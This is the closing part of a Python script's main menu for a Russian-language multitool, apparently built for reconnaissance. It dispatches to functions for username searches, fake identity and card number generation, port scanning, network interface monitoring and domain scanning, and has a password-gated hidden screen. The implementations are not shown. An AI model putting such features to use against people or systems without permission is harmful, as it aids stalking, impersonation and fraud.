            crawl_website(url)
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '5':
            url = input(Style.BRIGHT + "Введите URL для поиска: ").strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                print(Fore.YELLOW + "[!] Это невалидная ссылка. Начинай с http:// или https://")
                print(Fore.LIGHTYELLOW_EX + "Очистка экрана через 3 сек...")
                time.sleep(3)
                clear()
                continue
            analyze_domain(url)
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '6':
            username = input(Style.BRIGHT + "Введите юзернейм для поиска: ").strip()
            print(Fore.YELLOW + "[~] Идёт поиск...")
            search_username(username)
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()
        
        elif choice == '7':
            generate_fake_identity()
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()
            
        elif choice == '8':
            gradient = input(Style.BRIGHT + "Выбери градиент для банворда (default, galaxy, sunset, toxic, berry, dark или dragon): ")
            if gradient in presets:
                print(gradient_ascii(art, gradient=gradient))
            else:
                print(Fore.RED + "[-] Невалидный градиент, выбери из списка выше")
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '9':
            generate_card_number()
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '10':
            mac = input(Style.BRIGHT + "Введите MAC адрес: ").strip()
            mac_lookup(mac)
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '11':
            try:
                count = input(Style.BRIGHT + "Введите кол-во User-Agent (1-10): ").strip()
                number = int(count)
                if 1 <= number <= 10:
                    generate_user_agents(number)
                else:
                    print(Fore.RED + "[!] От 1 до 10 число укажи")
            except ValueError:
                print(Fore.RED + "[-] Введи именно число")
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '12':
            port_scanner()
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '13':
            interface = input("Введите интерфейс для мониторинга(например: eth0, wifi0): ").strip()
            try:
                shadow_network_monitor(interface)
            except Exception as e:
                print(Fore.RED + f"Ошибка: {e}")
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '14':
            url = input(Style.BRIGHT + "Введите URL для поиска: ").strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                print(Fore.YELLOW + "[!] Это невалидная ссылка. Начинай с http:// или https://")
                input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
                clear()
                continue
            cybersec_scan(url)

            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '15':
            password = input(Fore.LIGHTCYAN_EX + "Введи пароль для визита: ").strip()
            if password != 'Umbra':
                print(Fore.RED + "Не угадал :(")
                return
            else:
                curses.wrapper(theater_of_shadows)

            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '16':
            domain = input(Style.BRIGHT + "Введите домен (пример: example.com): ").strip()
            data = orange_scout_gather(domain)
            pretty_print_report(data)

            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()
            
        else:
            print(Fore.RED + "[-] Неверный выбор. Попробуйте ещё раз.")
            print(Fore.LIGHTYELLOW_EX + "[!] Очистка экрана через 3 сек...")
            time.sleep(3)
            clear()

if __name__ == "__main__":
    main()
